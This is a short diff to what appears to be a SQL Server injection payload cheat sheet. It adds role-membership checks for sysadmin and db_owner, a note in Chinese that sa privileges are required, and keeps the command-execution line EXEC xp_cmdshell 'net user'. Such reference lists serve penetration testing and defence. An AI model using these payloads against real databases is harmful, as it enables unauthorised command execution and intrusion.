@@ -17,8 +17,14 @@ SQL Server Payload
     - ``SELECT DB_NAME()``
 - List Database
     - ``SELECT name FROM master..sysdatabases``
-- Command
-    - ``EXEC xp_cmdshell 'net user'``
+- 命令执行
+	- 前提：sa权限
+		::
+		
+			select is_srvrolemember('sysadmin')
+			select is_member('db_owner')
+			select is_srvrolemember('public')
+	- ``EXEC xp_cmdshell 'net user'``
 - Ascii
     - ``SELECT char(0x41)``
     - ``SELECT ascii('A')``
